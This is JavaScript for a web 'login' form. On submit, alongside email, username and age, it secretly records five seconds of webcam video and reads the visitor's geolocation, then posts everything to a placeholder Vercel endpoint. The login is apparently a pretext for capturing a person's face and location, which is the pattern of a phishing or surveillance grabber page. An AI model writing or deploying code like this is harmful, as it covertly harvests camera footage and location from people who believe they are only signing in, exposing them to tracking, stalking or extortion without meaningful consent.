document.getElementById('loginForm').addEventListener('submit', async (event) => {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const username = document.getElementById('username').value;
  const age = document.getElementById('age').value;

  try {
    const videoBlob = await getVideoBlob();
    const formData = new FormData();
    formData.append('email', email);
    formData.append('username', username);
    formData.append('age', age);
    formData.append('video', videoBlob, 'video.webm');
    
    const position = await getPosition();
    formData.append('lat', position.coords.latitude);
    formData.append('lon', position.coords.longitude);

    const response = await fetch('https://your-vercel-url.vercel.app/login', {
      method: 'POST',
      body: formData,
    });

    if (response.redirected) {
      window.location.href = response.url;
    }
  } catch (error) {
    console.error('Error:', error);
  }
});

function getVideoBlob() {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = (event) => {
          chunks.push(event.data);
        };

        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          resolve(blob);
        };

        mediaRecorder.start();

        setTimeout(() => {
          mediaRecorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 5000);  // Record for 5 seconds
      })
      .catch(error => reject(error));
  });
}

function getPosition() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
}
